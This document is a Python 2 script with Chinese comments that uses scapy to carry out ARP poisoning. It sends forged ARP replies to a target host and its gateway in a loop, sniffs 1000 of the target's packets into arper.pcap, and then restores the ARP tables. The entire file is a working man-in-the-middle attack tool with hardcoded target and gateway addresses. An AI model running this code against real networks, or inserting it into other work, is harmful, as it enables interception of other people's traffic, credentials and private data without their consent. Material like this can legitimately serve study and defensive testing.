# !/usr/bin/python
# -*- coding:utf-8 -*_
from scapy.all import *
import os
import sys
import threading
import signal
poisoning = True
interface = 'eth0'
##'eth0'
target_ip = '10.1.1.5'
gateway_ip = '10.1.1.1' 

packet_count = 1000
# 设置嗅探网卡
conf.iface = interface
# 关闭输出
conf.verb = 0  ###?

# 定义restore_target函数
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] restoring target..."
    send(ARP(op = 2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
    send(ARP(op = 2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)


# 定义get_mac获取mac的函数
def get_mac(ip_address):
    response, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_address),timeout = 2, retry = 10)
    # 返回从相应数据中获取目标mac
    for s, r in response:
        return r[Ether].src
    return None

# 定义posion_target函数
def posion_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning
    # 构建欺骗网关的ARP包
    posion_gateway = ARP()
    posion_gateway.op = 2
    posion_gateway.psrc = target_ip
    posion_gateway.pdst = gateway_ip
    posion_gateway.hwdst = gateway_mac

    # 构建欺骗目标ip的ARP包
    posion_target = ARP()
    posion_target.op = 2
    posion_target.psrc = gateway_ip
    posion_target.pdst = target_ip
    posion_target.hwdst = target_mac

    print "[*] Beginning the ARP posion.[CTRL-C to stop]"

    while poisoning:
        try:
            send(posion_target)
            send(posion_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print "[*] ARP posion finished"
    return



print "[*] setting up %s" % interface

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting"
    sys.exit(0)
else:
    print "[*] gateway %s MAC is: %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print "[!!!] Failed to get target MAC.Exiting"
    sys.exit(0)
else:
    print "[*] target %s MAC is %s" % (target_ip, target_mac)

# 启动ARP投毒线程
posion_thread = threading.Thread(target = posion_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
posion_thread.start()

try:
    print "[*] starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)


except KeyboardInterrupt:
    pass
finally:
    print "[*] Writing packets to arper.pcap"
    wrpcap('arper.pcap',packets)
    poisoning = False
    # 将捕获数据包输出到文件
    wrpcap('arper.pcap', packets)
    time.sleep(2)
    # 还原网卡设置
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
